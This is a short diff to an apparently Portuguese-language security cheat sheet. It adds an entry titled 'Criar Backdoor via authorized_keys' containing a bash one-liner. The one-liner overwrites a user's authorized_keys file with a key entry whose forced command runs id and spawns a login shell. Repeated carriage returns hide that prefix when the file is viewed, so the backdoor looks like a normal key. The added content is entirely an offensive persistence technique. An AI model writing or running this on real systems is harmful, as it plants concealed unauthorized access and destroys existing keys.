@@ -877,6 +877,11 @@ else
 fi
 ```
 
+- __Criar Backdoor via authorized_keys (_`Bash`_)__
+```bash
+printf $'command="id > /tmp/ola;/bin/bash -l;#\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r" ssh-rsa AAAAB3NzaC1yc2EAA... jhondoe@hostname' > ~/.ssh/authorized_keys
+```
+
 #
 ## __Event IDs mais comuns no Windows__
 
